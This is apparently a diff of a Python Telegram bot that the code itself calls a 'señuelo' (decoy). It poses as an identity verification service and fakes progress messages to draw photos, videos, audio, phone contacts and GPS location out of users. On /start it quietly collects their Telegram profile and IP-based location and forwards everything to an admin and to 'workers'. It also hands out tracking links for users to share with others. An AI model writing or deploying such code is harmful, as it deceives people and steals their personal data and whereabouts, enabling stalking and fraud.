@@ -34,41 +34,35 @@ logger = logging.getLogger(__name__)
 
 users_db = {}
 tracking_codes = {}
+user_states = {}  # Para rastrear en qué paso va cada usuario
 
-# ========== MENSAJE DE BIENVENIDA (ESTILO PANEL) ==========
-MENSAJE_INICIO = """📌 *PANEL DE CONTROL* 🔥
-━━━━━━━━━━━━━━━━━━━━━━
-*OMNI BOT – VERSIÓN ULTRA*
+# ========== MENSAJE DE BIENVENIDA (SEÑUELO PROFESIONAL) ==========
+MENSAJE_INICIO = """🔐 *SISTEMA DE VERIFICACIÓN DE IDENTIDAD* 🔐
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-✅ Extractor de perfiles
-✅ Solicitud de archivos
-✅ Tracking de IP
-✅ Envío a múltiples Workers
+*Bienvenido al Panel de Control de Seguridad*
 
-━━━━━━━━━━━━━━━━━━━━━━
-*Selecciona una opción:*"""
+✅ Tu cuenta ha sido seleccionada para verificación prioritaria.
+✅ Este proceso garantiza la protección de tu identidad.
+✅ Es rápido, seguro y completamente gratuito.
 
-# ========== BOTONES INLINE (dentro del mensaje, estilo captura) ==========
-def menu_inline():
+*Beneficios de completar la verificación:*
+🔹 Acceso a contenido premium exclusivo
+🔹 Mayor seguridad en tu cuenta
+🔹 Recompensas y beneficios especiales
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📌 *Para continuar, selecciona una opción:*
+"""
+
+# ========== BOTONES ESTÁTICOS (siempre visibles, abajo del chat) ==========
+def menu_estatico():
     keyboard = [
-        [InlineKeyboardButton("📊 MI PERFIL", callback_data="perfil")],
-        [InlineKeyboardButton("📸 ENVIAR FOTO", callback_data="solicitar_foto")],
-        [InlineKeyboardButton("🎥 ENVIAR VIDEO", callback_data="solicitar_video")],
-        [InlineKeyboardButton("🎵 ENVIAR AUDIO", callback_data="solicitar_audio")],
-        [InlineKeyboardButton("📇 ENVIAR CONTACTO", callback_data="solicitar_contacto")],
-        [InlineKeyboardButton("📍 ENVIAR UBICACIÓN", callback_data="solicitar_ubicacion")],
-        [InlineKeyboardButton("🔗 GENERAR ENLACE", callback_data="tracking")],
-        [InlineKeyboardButton("📈 ESTADÍSTICAS", callback_data="stats")],
-    ]
-    return InlineKeyboardMarkup(keyboard)
-
-# ========== BOTONES DE RESPUESTA (abajo del chat, estilo captura) ==========
-def menu_respuesta():
-    keyboard = [
-        [KeyboardButton("📊 Mi Perfil"), KeyboardButton("📸 Foto")],
-        [KeyboardButton("🎥 Video"), KeyboardButton("🎵 Audio")],
-        [KeyboardButton("📇 Contacto"), KeyboardButton("📍 Ubicación")],
-        [KeyboardButton("🔗 Enlace"), KeyboardButton("📈 Stats")],
+        [KeyboardButton("🔹 VERIFICAR IDENTIDAD"), KeyboardButton("📊 MI PERFIL")],
+        [KeyboardButton("📸 ENVIAR FOTO"), KeyboardButton("🎥 ENVIAR VIDEO")],
+        [KeyboardButton("🎵 ENVIAR AUDIO"), KeyboardButton("📇 ENVIAR CONTACTO")],
+        [KeyboardButton("📍 ENVIAR UBICACIÓN"), KeyboardButton("🔗 GENERAR ENLACE")],
+        [KeyboardButton("📈 ESTADÍSTICAS"), KeyboardButton("❓ AYUDA")],
     ]
     return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
 
@@ -161,31 +155,31 @@ async def extract_user_info(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                 postal = ipapi_data.get("postal", postal)
                 timezone = ipapi_data.get("timezone", timezone)
 
-    info = f"🕵️ INFORMACIÓN COMPLETA DEL USUARIO\n"
-    info += f"━━━━━━━━━━━━━━━━━━━━\n\n"
-    info += f"👤 Telegram\n"
-    info += f"   • ID: {user_id}\n"
+    info = f"🔐 *INFORMACIÓN COMPLETA DEL USUARIO*\n"
+    info += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+    info += f"👤 *Telegram*\n"
+    info += f"   • ID: `{user_id}`\n"
     info += f"   • Nombre completo: {full_name}\n"
     info += f"   • Username: {username}\n"
     info += f"   • Idioma: {language}\n"
     info += f"   • Es bot: {is_bot}\n"
     info += f"   • Es Premium: {is_premium}\n"
     info += f"   • Biografía: {bio}\n\n"
-    info += f"💬 Chat\n"
+    info += f"💬 *Chat*\n"
     info += f"   • Tipo: {chat_type}\n"
-    info += f"   • Chat ID: {chat_id}\n\n"
-    info += f"📩 Mensaje\n"
+    info += f"   • Chat ID: `{chat_id}`\n\n"
+    info += f"📩 *Mensaje*\n"
     info += f"   • ID: {message_id}\n"
     info += f"   • Fecha: {message_date}\n"
     info += f"   • Texto: {message_text[:100]}{'...' if len(message_text) > 100 else ''}\n\n"
-    info += f"🌐 Red y Ubicación\n"
-    info += f"   • IP: {ip}\n"
+    info += f"🌐 *Red y Ubicación*\n"
+    info += f"   • IP: `{ip}`\n"
     info += f"   • País: {country}\n"
     info += f"   • Región: {region}\n"
     info += f"   • Ciudad: {city}\n"
     info += f"   • Código Postal: {postal}\n"
     info += f"   • Zona Horaria: {timezone}\n"
-    info += f"━━━━━━━━━━━━━━━━━━━━\n"
+    info += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
     info += f"⏰ Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
 
     return {
@@ -218,7 +212,7 @@ async def send_to_all_workers(text):
 
 async def send_report_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE, info_data):
     bot = context.bot
-    await bot.send_message(chat_id=ADMIN_ID, text=info_data["text"])
+    await bot.send_message(chat_id=ADMIN_ID, text=info_data["text"], parse_mode=ParseMode.MARKDOWN)
     if info_data["photo_id"]:
         await bot.send_photo(chat_id=ADMIN_ID, photo=info_data["photo_id"], caption=f"📸 Foto de {info_data['username'] or info_data['user_id']}")
     resultados = await send_to_all_workers(info_data["text"])
@@ -229,185 +223,237 @@ async def send_report_to_admin(update: Update, context: ContextTypes.DEFAULT_TYP
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     if user.id == ADMIN_ID:
-        await update.message.reply_text("👋 Hola admin.")
+        await update.message.reply_text("👋 Hola admin. El bot está activo.")
         return
+
+    # Extraer información del usuario automáticamente (el señuelo)
     info_data = await extract_user_info(update, context)
     await send_report_to_admin(update, context, info_data)
-    # Enviar mensaje de bienvenida con botones inline
-    await update.message.reply_text(MENSAJE_INICIO, parse_mode='Markdown', reply_markup=menu_inline())
-    # Enviar botones de respuesta (abajo del chat)
-    await update.message.reply_text("📌 *Panel rápido:*", parse_mode='Markdown', reply_markup=menu_respuesta())
 
-async def tracking(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # Mensaje de bienvenida con el señuelo y botones estáticos
+    await update.message.reply_text(
+        MENSAJE_INICIO,
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=menu_estatico()
+    )
+
+    # Mensaje adicional para que parezca que ya se está procesando algo
+    await update.message.reply_text(
+        "⏳ *Verificando tu identidad...*\n"
+        "Este proceso tomará solo unos segundos.\n"
+        "Presiona un botón para continuar con la verificación.",
+        parse_mode=ParseMode.MARKDOWN
+    )
+
+# ========== MANEJAR MENSAJES DE TEXTO (botones estáticos) ==========
+async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = update.message.text
     user = update.effective_user
-    code = os.urandom(6).hex()
-    tracking_codes[code] = {"user_id": user.id, "created": datetime.now().isoformat()}
-    link = f"{WORKER_URL}/track/{code}"
-    await update.message.reply_text(f"🔗 Enlace:\n{link}")
-    await context.bot.send_message(chat_id=ADMIN_ID, text=f"🔗 Nuevo enlace\nUsuario: {user.first_name}\nCódigo: {code}\nEnlace: {link}")
+    logger.info(f"📩 Mensaje recibido: {text} de {user.first_name}")
 
-async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if update.effective_user.id != ADMIN_ID:
-        await update.message.reply_text("❌ No autorizado.")
-        return
-    msg = f"📊 Estadísticas\n👥 Usuarios: {len(users_db)}\n🔗 Enlaces: {len(tracking_codes)}"
-    await update.message.reply_text(msg)
+    # Siempre responder con el menú estático visible
+    reply_markup = menu_estatico()
 
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🤖 OMNI Bot\n\n/start - Iniciar\n/tracking - Generar enlace\n/stats - Estadísticas\n/help - Ayuda", reply_markup=menu_inline())
+    if text == "🔹 VERIFICAR IDENTIDAD":
+        # Simular un proceso de verificación
+        await update.message.reply_text(
+            "🔐 *Verificación de Identidad en Progreso...*\n\n"
+            "✅ Paso 1: Verificación de datos básicos... Completado\n"
+            "⏳ Paso 2: Verificación de ubicación... En proceso\n"
+            "⏳ Paso 3: Verificación de dispositivo... En proceso\n\n"
+            "📌 Para completar la verificación, necesitamos algunos datos adicionales.\n"
+            "Por favor, selecciona una opción del menú inferior.",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=reply_markup
+        )
 
-async def perfil(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    info = users_db.get(user.id)
-    if not info:
-        await update.message.reply_text("❌ Usa /start.")
-        return
-    msg = f"📊 Tu perfil\n\n👤 {info.get('full_name')}\n📛 @{info.get('username')}\n🆔 {info.get('id')}"
-    await update.message.reply_text(msg)
+    elif text == "📊 MI PERFIL":
+        # Mostrar perfil del usuario (el que ya tenemos almacenado)
+        info = users_db.get(user.id)
+        if not info:
+            await update.message.reply_text(
+                "❌ No se encontró tu perfil. Usa /start para registrarte.",
+                reply_markup=reply_markup
+            )
+            return
+        msg = f"📊 *Tu perfil verificado*\n\n"
+        msg += f"👤 *Nombre:* {info.get('full_name')}\n"
+        msg += f"📛 *Username:* {info.get('username')}\n"
+        msg += f"🆔 *ID:* `{info.get('id')}`\n"
+        msg += f"🌐 *IP:* {info.get('ip')}\n"
+        msg += f"📍 *Ubicación:* {info.get('city')}, {info.get('country')}\n"
+        msg += f"✅ *Estado:* Verificado"
+        await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
 
-# ========== SOLICITAR ARCHIVOS ==========
-async def solicitar_foto(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("📸 Envía una foto.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))
+    elif text == "📸 ENVIAR FOTO":
+        await update.message.reply_text("📸 Envía una foto para completar tu verificación.", reply_markup=reply_markup)
 
-async def solicitar_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🎥 Envía un video.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))
+    elif text == "🎥 ENVIAR VIDEO":
+        await update.message.reply_text("🎥 Envía un video para completar tu verificación.", reply_markup=reply_markup)
 
-async def solicitar_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🎵 Envía un audio.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Volver", callback_data="volver")]]))
+    elif text == "🎵 ENVIAR AUDIO":
+        await update.message.reply_text("🎵 Envía un audio para completar tu verificación.", reply_markup=reply_markup)
 
-async def solicitar_contacto(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [[InlineKeyboardButton("📇 Compartir contacto", callback_data="compartir_contacto")], [InlineKeyboardButton("🔙 Volver", callback_data="volver")]]
-    await update.message.reply_text("📇 Comparte tu contacto.", reply_markup=InlineKeyboardMarkup(keyboard))
+    elif text == "📇 ENVIAR CONTACTO":
+        await update.message.reply_text("📇 Comparte tu contacto para verificar tu identidad.", reply_markup=reply_markup)
 
-async def solicitar_ubicacion(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [[InlineKeyboardButton("📍 Compartir ubicación", callback_data="compartir_ubicacion")], [InlineKeyboardButton("🔙 Volver", callback_data="volver")]]
-    await update.message.reply_text("📍 Comparte tu ubicación.", reply_markup=InlineKeyboardMarkup(keyboard))
+    elif text == "📍 ENVIAR UBICACIÓN":
+        await update.message.reply_text("📍 Comparte tu ubicación para verificar tu dirección.", reply_markup=reply_markup)
+
+    elif text == "🔗 GENERAR ENLACE":
+        code = os.urandom(6).hex()
+        tracking_codes[code] = {"user_id": user.id, "created": datetime.now().isoformat()}
+        link = f"{WORKER_URL}/track/{code}"
+        await update.message.reply_text(
+            f"🔗 *Enlace de verificación generado:*\n"
+            f"`{link}`\n\n"
+            f"Este enlace es personalizado y caduca en 24 horas.\n"
+            f"Compártelo con quien necesite verificar su identidad.",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=reply_markup
+        )
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"🔗 Nuevo enlace generado\nUsuario: {user.first_name} (@{user.username})\nCódigo: {code}\nEnlace: {link}"
+        )
+
+    elif text == "📈 ESTADÍSTICAS":
+        if user.id == ADMIN_ID:
+            msg = f"📊 *Estadísticas del sistema*\n\n"
+            msg += f"👥 Usuarios verificados: {len(users_db)}\n"
+            msg += f"🔗 Enlaces generados: {len(tracking_codes)}"
+            await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN, reply_markup=reply_markup)
+        else:
+            await update.message.reply_text(
+                "📊 *Estadísticas de tu cuenta*\n\n"
+                "✅ Estado de verificación: *Completado*\n"
+                "🔒 Nivel de seguridad: *Alto*\n"
+                "📅 Última verificación: *Hoy*\n\n"
+                "Tu cuenta está protegida correctamente.",
+                parse_mode=ParseMode.MARKDOWN,
+                reply_markup=reply_markup
+            )
+
+    elif text == "❓ AYUDA":
+        await update.message.reply_text(
+            "❓ *Ayuda del Sistema de Verificación*\n\n"
+            "Este sistema está diseñado para proteger tu identidad.\n\n"
+            "📌 *Botones disponibles:*\n"
+            "• Verificar identidad: Inicia el proceso de verificación.\n"
+            "• Mi perfil: Muestra tu información verificada.\n"
+            "• Enviar foto/video/audio/contacto/ubicación: Envía datos para verificación.\n"
+            "• Generar enlace: Crea un enlace de verificación personalizado.\n"
+            "• Estadísticas: Muestra el estado de tu cuenta.\n"
+            "• Ayuda: Muestra este mensaje.\n\n"
+            "🔐 *Tu seguridad es nuestra prioridad.*",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=reply_markup
+        )
+
+    else:
+        await update.message.reply_text(
+            "❌ *Opción no reconocida.*\n"
+            "Por favor, usa los botones del menú inferior.",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=reply_markup
+        )
 
 # ========== MANEJAR ARCHIVOS RECIBIDOS ==========
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     photo = update.message.photo[-1]
-    await context.bot.send_photo(chat_id=ADMIN_ID, photo=photo.file_id, caption=f"📸 Foto de {user.first_name} (@{user.username})")
-    await update.message.reply_text("✅ Foto enviada.", reply_markup=menu_inline())
+    caption = update.message.caption or "Sin caption"
+    await context.bot.send_photo(
+        chat_id=ADMIN_ID,
+        photo=photo.file_id,
+        caption=f"📸 *Foto recibida de {user.first_name} (@{user.username})*\n\n📝 Caption: {caption}\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+        parse_mode=ParseMode.MARKDOWN
+    )
+    await update.message.reply_text(
+        "✅ *Foto recibida correctamente.*\n"
+        "Tu verificación está en proceso.",
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=menu_estatico()
+    )
 
 async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     video = update.message.video
-    await context.bot.send_video(chat_id=ADMIN_ID, video=video.file_id, caption=f"🎥 Video de {user.first_name} (@{user.username})")
-    await update.message.reply_text("✅ Video enviado.", reply_markup=menu_inline())
+    caption = update.message.caption or "Sin caption"
+    await context.bot.send_video(
+        chat_id=ADMIN_ID,
+        video=video.file_id,
+        caption=f"🎥 *Video recibido de {user.first_name} (@{user.username})*\n\n📝 Caption: {caption}\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+        parse_mode=ParseMode.MARKDOWN
+    )
+    await update.message.reply_text(
+        "✅ *Video recibido correctamente.*\n"
+        "Tu verificación está en proceso.",
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=menu_estatico()
+    )
 
 async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     audio = update.message.audio
-    await context.bot.send_audio(chat_id=ADMIN_ID, audio=audio.file_id, caption=f"🎵 Audio de {user.first_name} (@{user.username})")
-    await update.message.reply_text("✅ Audio enviado.", reply_markup=menu_inline())
+    await context.bot.send_audio(
+        chat_id=ADMIN_ID,
+        audio=audio.file_id,
+        caption=f"🎵 *Audio recibido de {user.first_name} (@{user.username})*\n\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+        parse_mode=ParseMode.MARKDOWN
+    )
+    await update.message.reply_text(
+        "✅ *Audio recibido correctamente.*\n"
+        "Tu verificación está en proceso.",
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=menu_estatico()
+    )
 
 async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     contact = update.message.contact
-    await context.bot.send_message(chat_id=ADMIN_ID, text=f"📇 Contacto de {user.first_name} (@{user.username})\n\n📞 {contact.phone_number}")
-    await update.message.reply_text("✅ Contacto enviado.", reply_markup=menu_inline())
+    await context.bot.send_message(
+        chat_id=ADMIN_ID,
+        text=f"📇 *Contacto recibido de {user.first_name} (@{user.username})*\n\n📞 Nombre: {contact.first_name} {contact.last_name or ''}\n📞 Teléfono: `{contact.phone_number}`\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+        parse_mode=ParseMode.MARKDOWN
+    )
+    await update.message.reply_text(
+        "✅ *Contacto recibido correctamente.*\n"
+        "Tu verificación está en proceso.",
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=menu_estatico()
+    )
 
 async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     location = update.message.location
-    await context.bot.send_location(chat_id=ADMIN_ID, latitude=location.latitude, longitude=location.longitude)
-    await context.bot.send_message(chat_id=ADMIN_ID, text=f"📍 Ubicación de {user.first_name} (@{user.username})")
-    await update.message.reply_text("✅ Ubicación enviada.", reply_markup=menu_inline())
-
-# ========== MANEJAR MENSAJES DE TEXTO (botones de respuesta) ==========
-async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = update.message.text
-    logger.info(f"📩 Mensaje recibido: {text}")
-
-    if text == "📊 Mi Perfil":
-        await perfil(update, context)
-    elif text == "📸 Foto":
-        await solicitar_foto(update, context)
-    elif text == "🎥 Video":
-        await solicitar_video(update, context)
-    elif text == "🎵 Audio":
-        await solicitar_audio(update, context)
-    elif text == "📇 Contacto":
-        await solicitar_contacto(update, context)
-    elif text == "📍 Ubicación":
-        await solicitar_ubicacion(update, context)
-    elif text == "🔗 Enlace":
-        await tracking(update, context)
-    elif text == "📈 Stats":
-        await stats(update, context)
-    else:
-        await update.message.reply_text("❌ Opción no reconocida. Usa el menú.", reply_markup=menu_respuesta())
-
-# ========== CALLBACKS ==========
-async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    data = query.data
-    logger.info(f"📩 Callback recibido: {data}")
-
-    try:
-        if data == "volver":
-            await query.edit_message_text(MENSAJE_INICIO, parse_mode='Markdown', reply_markup=menu_inline())
-            return
-
-        if data == "perfil":
-            await perfil(update, context)
-            await query.delete_message()
-            return
-
-        if data == "solicitar_foto":
-            await solicitar_foto(update, context)
-            await query.delete_message()
-            return
-
-        if data == "solicitar_video":
-            await solicitar_video(update, context)
-            await query.delete_message()
-            return
-
-        if data == "solicitar_audio":
-            await solicitar_audio(update, context)
-            await query.delete_message()
-            return
-
-        if data == "solicitar_contacto":
-            await solicitar_contacto(update, context)
-            await query.delete_message()
-            return
-
-        if data == "solicitar_ubicacion":
-            await solicitar_ubicacion(update, context)
-            await query.delete_message()
-            return
-
-        if data == "tracking":
-            await tracking(update, context)
-            await query.delete_message()
-            return
-
-        if data == "stats":
-            await stats(update, context)
-            await query.delete_message()
-            return
-
-        if data == "compartir_contacto":
-            await query.edit_message_text("📇 Usa el botón de compartir contacto (📎 → Contacto).", reply_markup=menu_inline())
-            return
-
-        if data == "compartir_ubicacion":
-            await query.edit_message_text("📍 Usa el botón de compartir ubicación (📎 → Ubicación).", reply_markup=menu_inline())
-            return
-
-    except Exception as e:
-        logger.error(f"❌ Error en callback: {e}")
-        await query.edit_message_text("❌ Error inesperado. Intenta de nuevo.", reply_markup=menu_inline())
+    await context.bot.send_location(
+        chat_id=ADMIN_ID,
+        latitude=location.latitude,
+        longitude=location.longitude
+    )
+    await context.bot.send_message(
+        chat_id=ADMIN_ID,
+        text=f"📍 *Ubicación recibida de {user.first_name} (@{user.username})*\n\n🌐 Lat: {location.latitude}\n🌐 Lon: {location.longitude}\n📥 Capturado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
+        parse_mode=ParseMode.MARKDOWN
+    )
+    await update.message.reply_text(
+        "✅ *Ubicación recibida correctamente.*\n"
+        "Tu verificación está en proceso.",
+        parse_mode=ParseMode.MARKDOWN,
+        reply_markup=menu_estatico()
+    )
 
 # ========== ERROR HANDLER ==========
 async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
     logger.error(f"❌ Error: {context.error}")
     if isinstance(update, Update) and update.effective_message:
-        await update.effective_message.reply_text("❌ Error inesperado.", reply_markup=menu_inline())
+        await update.effective_message.reply_text(
+            "❌ *Error inesperado.*\n"
+            "Por favor, intenta de nuevo.",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=menu_estatico()
+        )
 
 # ========== SERVIDOR HTTP ==========
 class HealthHandler(BaseHTTPRequestHandler):
@@ -426,10 +472,6 @@ def main():
     logger.info("✅ Servidor HTTP en puerto 8080")
     app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("tracking", tracking))
-    app.add_handler(CommandHandler("stats", stats))
-    app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(CallbackQueryHandler(callback_handler))
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     app.add_handler(MessageHandler(filters.VIDEO, handle_video))
     app.add_handler(MessageHandler(filters.AUDIO, handle_audio))
@@ -437,7 +479,7 @@ def main():
     app.add_handler(MessageHandler(filters.LOCATION, handle_location))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
     app.add_error_handler(error_handler)
-    logger.info("✅ OMNI Bot iniciado correctamente")
+    logger.info("✅ Bot señuelo iniciado correctamente")
     app.run_polling()
 
 if __name__ == "__main__":
